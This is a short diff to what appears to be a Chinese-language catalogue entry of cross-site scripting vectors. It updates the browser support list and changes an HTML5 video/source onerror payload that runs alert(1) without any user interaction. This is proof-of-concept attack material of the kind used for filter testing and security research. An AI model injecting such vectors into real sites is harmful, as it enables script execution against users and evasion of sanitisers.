@@ -1,7 +1,7 @@
 -----
 
-* 浏览器支持：Opera 10.5以上，Chrome 4.0以上，Firefox 4.0以上
-* 特性：video新特性，source标签onerror可以引入JS
+* 浏览器支持：Firefox 3.5以上、IE9.0以上
+* 特性：video新特性，onerror可以引入事件处理JS
 * 环境：不需要用户交互。
 * 漏洞类型：XSS
 
@@ -11,7 +11,7 @@
 ------
 
 ```
-<video><source onerror="alert(1)">
+<video onerror="alert(1)"><source></source></video>
 ```
 
 
